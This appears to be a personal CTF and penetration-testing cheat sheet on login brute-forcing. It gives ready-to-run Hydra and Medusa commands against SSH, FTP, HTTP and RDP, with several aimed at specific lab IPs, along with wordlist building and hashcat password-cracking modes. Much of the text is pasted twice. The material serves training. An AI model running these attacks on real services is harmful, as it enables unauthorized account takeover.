# Login Attacks
This page provides a concise overview of **login and brute-force attacks**, common tooling, wordlists, and real-world techniques used during **CTFs and penetration tests**.

## What Is Login Brute Forcing?
Login brute forcing is an attack technique where an attacker systematically attempts multiple username and password combinations against a login mechanism until valid credentials are discovered.

It is commonly used during:
- Initial access attempts
- Credential reuse testing
- Misconfiguration validation
- Default credential discovery


## Core Concepts
### Fundamentals of Brute Forcing
Brute-force attacks rely on automation to test large numbers of credential combinations. Common types include:
- **Password brute force** (one user, many passwords)
- **Username brute force** (one password, many users)
- **Credential stuffing** (reused credentials from breaches)

### Password Security
Weak passwords make brute-force attacks significantly easier. Common issues include:
- Short passwords
- Predictable patterns
- Lack of complexity
- Password reuse

Strong password policies reduce brute-force success but do not eliminate the risk.

### Default Credentials
Many services, routers, and applications ship with **default usernames and passwords**.  
If these are not changed, attackers can gain instant access without brute forcing.

Example:
```text
admin:admin
root:toor
````

---

## Brute Forcing in Practice
Brute forcing is commonly performed against:

* PIN-based systems
* HTTP basic authentication
* Web login forms
* Remote services (SSH, FTP, RDP)

Tools such as **Hydra** and **Medusa** automate this process.

## The Power of Wordlists
Rather than guessing randomly, attackers use **wordlists** containing:
* Leaked passwords
* Common patterns
* Organisation-specific terms
Custom wordlists significantly improve success rates.


## Common Wordlists

| Wordlist                          | Description                    | Typical Use               | Source         |
| --------------------------------- | ------------------------------ | ------------------------- | -------------- |
| rockyou.txt                       | Massive leaked password list   | Password brute forcing    | RockYou breach |
| top-usernames-shortlist.txt       | Small list of common usernames | Fast username guessing    | SecLists       |
| xato-net-10-million-usernames.txt | Large username list            | Thorough username attacks | SecLists       |
| 2023-200_most_used_passwords.txt  | Common modern passwords        | Credential reuse testing  | SecLists       |
| default-passwords.txt             | Known default credentials      | Router & service logins   | SecLists       |


## 🛠️ Building a Filtered Wordlist (Password Policy Matching)
### Scenario
Password policy:
* Minimum 8 characters
* At least one uppercase letter
* At least one lowercase letter
* At least one number

### Step-by-Step Filtering with `grep`

```bash
# Minimum length
grep -E '^.{8,}$' darkweb2017-top10000.txt > minlength.txt

# Uppercase letters
grep -E '[A-Z]' minlength.txt > uppercase.txt

# Lowercase letters
grep -E '[a-z]' uppercase.txt > lowercase.txt

# Numbers
grep -E '[0-9]' lowercase.txt > final-wordlist.txt
```

### One-Liner Alternative

```bash
grep -E '^.{8,}$' passwords.txt \
| grep -E '[A-Z]' \
| grep -E '[a-z]' \
| grep -E '[0-9]' > filtered.txt
```

## Creating Custom Wordlists
### Username Anarchy
Generate username variations from a real name.

```bash
sudo apt install ruby -y
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
./username-anarchy Jane Smith > jane_smith_usernames.txt
```

### CUPP (Common User Passwords Profiler)
Interactive tool for generating targeted password lists.

```bash
sudo apt install cupp -y
cupp -i
```

---

## Hydra

### Basic Syntax
```bash
hydra [options] <target> <service>
```

### Common Hydra Options

| Option | Description              |
| ------ | ------------------------ |
| `-l`   | Single username          |
| `-L`   | Username list            |
| `-p`   | Single password          |
| `-P`   | Password list            |
| `-t`   | Number of threads        |
| `-f`   | Stop after first success |
| `-s`   | Specify port             |
| `-vV`  | Verbose output           |
| `-o`   | Output file              |


### Hydra Service Examples
```bash
# FTP
hydra -L users.txt -P passwords.txt ftp://10.10.10.5

# SSH
hydra -L users.txt -P passwords.txt ssh://10.10.10.5

# HTTP GET
hydra -L users.txt -P passwords.txt http-get://10.10.10.5

# HTTP POST (login form)
hydra -L users.txt -P passwords.txt http-post-form \
"/login.php:username=^USER^&password=^PASS^:F=Invalid"

# SMTP
hydra -l user -P passwords.txt smtp://10.10.10.5

# MySQL
hydra -L users.txt -P passwords.txt mysql://10.10.10.5

# RDP
hydra -L users.txt -P passwords.txt rdp://10.10.10.5
```

---

## Medusa

### Basic Syntax

```bash
medusa -h <target> -U users.txt -P passwords.txt -M <module>
```

### Common Medusa Options

| Option | Description     |
| ------ | --------------- |
| `-u`   | Single username |
| `-U`   | Username list   |
| `-p`   | Single password |
| `-P`   | Password list   |
| `-M`   | Module          |
| `-t`   | Threads         |
| `-n`   | Port            |
| `-v`   | Verbose         |


### Medusa Service Examples

```bash
# SSH
medusa -h 10.10.10.5 -U users.txt -P passwords.txt -M ssh

# FTP
medusa -h 10.10.10.5 -U users.txt -P passwords.txt -M ftp

# MySQL
medusa -h 10.10.10.5 -U users.txt -P passwords.txt -M mysql

# Telnet
medusa -h 10.10.10.5 -U users.txt -P passwords.txt -M telnet

# HTTP Form
medusa -h 10.10.10.5 -U users.txt -P passwords.txt -M web-form
```

---

---

---


Hydra
------
To install Hydra use command `apt install hydra -y` or download from its Github Repository `git clone https://github.com/vanhauser-thc/thc-hydra`

* password wordlists /opt/useful/SecLists/Passwords/
* username wordlists /opt/useful/SecLists/Usernames/
* https://github.com/danielmiessler/SecLists
 
The most commonly used password wordlists is rockyou.txt, which has over 14 million unique passwords, sorted by how common they are. https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
/opt/useful/SecLists/Passwords/Default-Credentials
 ftp-betterdefaultpasslist.txt

### Hydra Options	Description
```-C ftp-betterdefaultpasslist.txt	Combined Credentials Wordlist
SERVER_IP	Target IP
-s PORT	Target Port
http-get	Request Method
/	Target Path
```

------Basic HTTP Auth Brute Forcing------
hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 46.101.20.243 -s 32221 http-get /


locate names.txt

hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f 178.35.49.134 -s 32901 http-get /

static pw
hydra -L /opt/useful/SecLists/Usernames/Names/usernames.txt -p amormio -u -f 178.35.49.134 -s 32901 http-get /

 hydra -h | grep "Supported services" | tr ":" "\n" | tr " " "\n" | column -e

---Brute Forcing Forms----

Determine Login Parameters
We can easily find POST parameters if we intercept the login request with Burp Suite or take a closer look at the admin panel's source code.

Using Browser
One of the easiest ways to capture a form's parameters is through using a browser's built in developer tools. For example, we can open firefox within PwnBox, and then bring up the Network Tools with [CTRL + SHIFT + E].

Once we do, we can simply try to login with any credentials (test:test) to run the form, after which the Network Tools would show the sent HTTP requests. Once we have the request, we can simply right-click on one of them, and select Copy > Copy POST data:

Another option would be to used Copy > Copy as cURL, which would copy the entire cURL command, which we can use in the Terminal to repeat the same HTTP request:


curl 'http://178.128.40.63:31554/login.php' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://178.128.40.63:31554' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Referer: http://178.128.40.63:31554/login.php' -H 'Cookie: PHPSESSID=8iafr4t6c3s2nhkaj63df43v05' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-GPC: 1' --data-raw 'username=test&password=test'


hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"

hydra -l user -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f 46.101.20.243 -s 32221 http-post-form "/admin_login.php:username=^USER^&password=^PASS^:F=<form name='login'"

curl 'http://46.101.20.243:32221/admin_login.php' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://46.101.20.243:32221' -H 'DNT: 1' -H 'Authorization: Basic dXNlcjpwYXNzd29yZA==' -H 'Connection: keep-alive' -H 'Referer: http://46.101.20.243:32221/admin_login.php' -H 'Cookie: PHPSESSID=hd495gtp1gu278ifim02kahvom' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-GPC: 1' --data-raw 'user=&pass='
Have to find verriables of USERNAME/PASSWORD , form name, ip and port, login page. 


SSH Attack
hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4
netstat -antp | grep -i list
hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1
ftp 127.0.0.1


CUPP
sudo apt install cupp or clone it from the Github repository
https://github.com/Mebus/cupp
cupp -i
sed -ri '/^.{,7}$/d' william.txt            # remove shorter than 8
sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt # remove no special chars
sed -ri '/[0-9]+/!d' william.txt            # remove no numbers


Custom Username Wordlist
git clone https://github.com/21y4d/usernameGenerator.git
bash usernameGenerator/usernameGenerator.sh 
bash usernameGenerator/usernameGenerator.sh Bill Gates

Hydra
Command	Description
hydra -h	hydra help
hydra -C wordlist.txt SERVER_IP -s PORT http-get /	Basic Auth Brute Force - Combined Wordlist
hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /	Basic Auth Brute Force - User/Pass Wordlists
hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"	Login Form Brute Force - Static User, Pass Wordlist
hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4	SSH Brute Force - User/Pass Wordlists
hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1	FTP Brute Force - Static User, Pass Wordlist
Wordlists
Command	Description
/opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt	Default Passwords Wordlist
/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt	Common Passwords Wordlist
/opt/useful/SecLists/Usernames/Names/names.txt	Common Names Wordlist
Misc
Command	Description
cupp -i	Creating Custom Password Wordlist
sed -ri '/^.{,7}$/d' william.txt	Remove Passwords Shorter Than 8
sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt	Remove Passwords With No Special Chars
sed -ri '/[0-9]+/!d' william.txt	Remove Passwords With No Numbers
git clone https://github.com/21y4d/usernameGenerator.git	Download usernameGenerator
bash usernameGenerator/usernameGenerator.sh <First Name> <Last Name>	usernameGenerator Usage
ssh b.gates@SERVER_IP -p PORT	SSH to Server
ftp 127.0.0.1	FTP to Server
su - user	Switch to User

Encryption

Generate an MD5 hash
echo -n "p@ssw0rd" | md5sum

Create the XOR ciphertext
python3
from pwn import xor 
xor("p@ssw0rd", "secret")

 pip install hashid	Install the hashid tool
sudo apt install hashcat or get from Git https://github.com/hashcat/hashcat

hashid '$DCC2$10240#tom#e4e938d12fe5974dc42a90120bd9c90f' -m

 hash types and their corresponding examples can be found here
https://hashcat.net/wiki/doku.php?id=example_hashes


CRACKING PASSWORDS WITH HASHCAT
cheat sheet
Command	Description
 pip install hashid	Install the hashid tool
hashid <hash> OR hashid <hashes.txt>	Identify a hash with the hashid tool
hashcat --example-hashes	View a list of Hashcat hash modes and example hashes
hashcat -b -m <hash mode>	Perform a Hashcat benchmark test of a specific hash mode
hashcat -b	Perform a benchmark of all hash modes
hashcat -O	Optimization: Increase speed but limit potential password length
hashcat -w 3	Optimization: Use when Hashcat is the only thing running, use 1 if running hashcat on your desktop. Default is 2
hashcat -a 0 -m <hash type> <hash file> <wordlist>	Dictionary attack
hashcat -a 1 -m <hash type> <hash file> <wordlist1> <wordlist2>	Combination attack
hashcat -a 3 -m 0 <hash file> -1 01 'ILFREIGHT?l?l?l?l?l20?1?d'	Sample Mask attack
hashcat -a 7 -m 0 <hash file> -1=01 '20?1?d' rockyou.txt	Sample Hybrid attack
crunch <minimum length> <maximum length> <charset> -t <pattern> -o <output file>	Make a wordlist with Crunch
python3 cupp.py -i	Use CUPP interactive mode
kwp -s 1 basechars/full.base keymaps/en-us.keymap routes/2-to-10-max-3-direction-changes.route	Kwprocessor example
cewl -d <depth to spider> -m <minimum word length> -w <output wordlist> <url of website>	Sample CeWL command
hashcat -a 0 -m 100 hash rockyou.txt -r rule.txt	Sample Hashcat rule syntax
./cap2hccapx.bin input.cap output.hccapx	cap2hccapx syntax
hcxpcaptool -z pmkidhash_corp cracking_pmkid.cap	hcxpcaptoolsyntax

 
 
 ________________-
 
 Hydra

 "apt install hydra -y" or download it and use it from its Github Repository but its pre-installed on Pwnbox.
https://github.com/vanhauser-thc/thc-hydra

password wordlists /opt/useful/SecLists/Passwords/
username wordlists /opt/useful/SecLists/Usernames/
https://github.com/danielmiessler/SecLists
t commonly used password wordlists is rockyou.txt, which has over 14 million unique passwords, sorted by how common they are, https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
/opt/useful/SecLists/Passwords/Default-Credentials
 ftp-betterdefaultpasslist.txt

Options	Description
-C ftp-betterdefaultpasslist.txt	Combined Credentials Wordlist
SERVER_IP	Target IP
-s PORT	Target Port
http-get	Request Method
/	Target Path

------Basic HTTP Auth Brute Forcing------
hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 46.101.20.243 -s 32221 http-get /


locate names.txt

hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f 178.35.49.134 -s 32901 http-get /

static pw
hydra -L /opt/useful/SecLists/Usernames/Names/usernames.txt -p amormio -u -f 178.35.49.134 -s 32901 http-get /

 hydra -h | grep "Supported services" | tr ":" "\n" | tr " " "\n" | column -e

---Brute Forcing Forms----

Determine Login Parameters
We can easily find POST parameters if we intercept the login request with Burp Suite or take a closer look at the admin panel's source code.

Using Browser
One of the easiest ways to capture a form's parameters is through using a browser's built in developer tools. For example, we can open firefox within PwnBox, and then bring up the Network Tools with [CTRL + SHIFT + E].

Once we do, we can simply try to login with any credentials (test:test) to run the form, after which the Network Tools would show the sent HTTP requests. Once we have the request, we can simply right-click on one of them, and select Copy > Copy POST data:

Another option would be to used Copy > Copy as cURL, which would copy the entire cURL command, which we can use in the Terminal to repeat the same HTTP request:


curl 'http://178.128.40.63:31554/login.php' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://178.128.40.63:31554' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Referer: http://178.128.40.63:31554/login.php' -H 'Cookie: PHPSESSID=8iafr4t6c3s2nhkaj63df43v05' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-GPC: 1' --data-raw 'username=test&password=test'


hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"

hydra -l user -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f 46.101.20.243 -s 32221 http-post-form "/admin_login.php:username=^USER^&password=^PASS^:F=<form name='login'"

curl 'http://46.101.20.243:32221/admin_login.php' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://46.101.20.243:32221' -H 'DNT: 1' -H 'Authorization: Basic dXNlcjpwYXNzd29yZA==' -H 'Connection: keep-alive' -H 'Referer: http://46.101.20.243:32221/admin_login.php' -H 'Cookie: PHPSESSID=hd495gtp1gu278ifim02kahvom' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-GPC: 1' --data-raw 'user=&pass='
Have to find verriables of USERNAME/PASSWORD , form name, ip and port, login page. 


SSH Attack
hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4
netstat -antp | grep -i list
hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1
ftp 127.0.0.1


CUPP
sudo apt install cupp or clone it from the Github repository
https://github.com/Mebus/cupp
cupp -i
sed -ri '/^.{,7}$/d' william.txt            # remove shorter than 8
sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt # remove no special chars
sed -ri '/[0-9]+/!d' william.txt            # remove no numbers


Custom Username Wordlist
git clone https://github.com/21y4d/usernameGenerator.git
bash usernameGenerator/usernameGenerator.sh 
bash usernameGenerator/usernameGenerator.sh Bill Gates

Hydra
Command	Description
hydra -h	hydra help
hydra -C wordlist.txt SERVER_IP -s PORT http-get /	Basic Auth Brute Force - Combined Wordlist
hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /	Basic Auth Brute Force - User/Pass Wordlists
hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"	Login Form Brute Force - Static User, Pass Wordlist
hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4	SSH Brute Force - User/Pass Wordlists
hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1	FTP Brute Force - Static User, Pass Wordlist
Wordlists
Command	Description
/opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt	Default Passwords Wordlist
/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt	Common Passwords Wordlist
/opt/useful/SecLists/Usernames/Names/names.txt	Common Names Wordlist
Misc
Command	Description
cupp -i	Creating Custom Password Wordlist
sed -ri '/^.{,7}$/d' william.txt	Remove Passwords Shorter Than 8
sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt	Remove Passwords With No Special Chars
sed -ri '/[0-9]+/!d' william.txt	Remove Passwords With No Numbers
git clone https://github.com/21y4d/usernameGenerator.git	Download usernameGenerator
bash usernameGenerator/usernameGenerator.sh <First Name> <Last Name>	usernameGenerator Usage
ssh b.gates@SERVER_IP -p PORT	SSH to Server
ftp 127.0.0.1	FTP to Server
su - user	Switch to User

Encryption

Generate an MD5 hash
echo -n "p@ssw0rd" | md5sum

Create the XOR ciphertext
python3
from pwn import xor 
xor("p@ssw0rd", "secret")

 pip install hashid	Install the hashid tool
sudo apt install hashcat or get from Git https://github.com/hashcat/hashcat

hashid '$DCC2$10240#tom#e4e938d12fe5974dc42a90120bd9c90f' -m

 hash types and their corresponding examples can be found here
https://hashcat.net/wiki/doku.php?id=example_hashes


CRACKING PASSWORDS WITH HASHCAT
cheat sheet
Command	Description
 pip install hashid	Install the hashid tool
hashid <hash> OR hashid <hashes.txt>	Identify a hash with the hashid tool
hashcat --example-hashes	View a list of Hashcat hash modes and example hashes
hashcat -b -m <hash mode>	Perform a Hashcat benchmark test of a specific hash mode
hashcat -b	Perform a benchmark of all hash modes
hashcat -O	Optimization: Increase speed but limit potential password length
hashcat -w 3	Optimization: Use when Hashcat is the only thing running, use 1 if running hashcat on your desktop. Default is 2
hashcat -a 0 -m <hash type> <hash file> <wordlist>	Dictionary attack
hashcat -a 1 -m <hash type> <hash file> <wordlist1> <wordlist2>	Combination attack
hashcat -a 3 -m 0 <hash file> -1 01 'ILFREIGHT?l?l?l?l?l20?1?d'	Sample Mask attack
hashcat -a 7 -m 0 <hash file> -1=01 '20?1?d' rockyou.txt	Sample Hybrid attack
crunch <minimum length> <maximum length> <charset> -t <pattern> -o <output file>	Make a wordlist with Crunch
python3 cupp.py -i	Use CUPP interactive mode
kwp -s 1 basechars/full.base keymaps/en-us.keymap routes/2-to-10-max-3-direction-changes.route	Kwprocessor example
cewl -d <depth to spider> -m <minimum word length> -w <output wordlist> <url of website>	Sample CeWL command
hashcat -a 0 -m 100 hash rockyou.txt -r rule.txt	Sample Hashcat rule syntax
./cap2hccapx.bin input.cap output.hccapx	cap2hccapx syntax
hcxpcaptool -z pmkidhash_corp cracking_pmkid.cap	hcxpcaptoolsyntax
https://medium.com/@WriteupsTHM_HTB_CTF/cracking-passwords-with-hashcat-hackthebox-1e50d859097b  
